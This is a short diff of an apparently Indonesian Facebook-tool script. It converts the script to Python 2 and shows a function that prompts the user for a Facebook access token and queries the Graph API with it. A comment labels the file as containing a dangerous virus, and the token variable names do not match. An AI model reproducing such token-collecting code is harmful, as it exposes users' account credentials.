@@ -1,5 +1,3 @@
-#!/usr/bin/python3
-
 # coding=utf-8
 
 # Mengandung Virus Berbahaya
@@ -95,7 +93,7 @@ raka_sayang_amanda = '953529338576547'
 def log_token():
     os.system("clear")
     banner()
-    token = input(m+"\n["+k+"?"+m+"]"+u+" Token : ")
+    token = raw_input(m+"\n["+k+"?"+m+"]"+u+" Token : ")
     try:
         otw = requests.get("https://graph.facebook.com/me?access_token=" + toket)
         a = json.loads(otw.text)
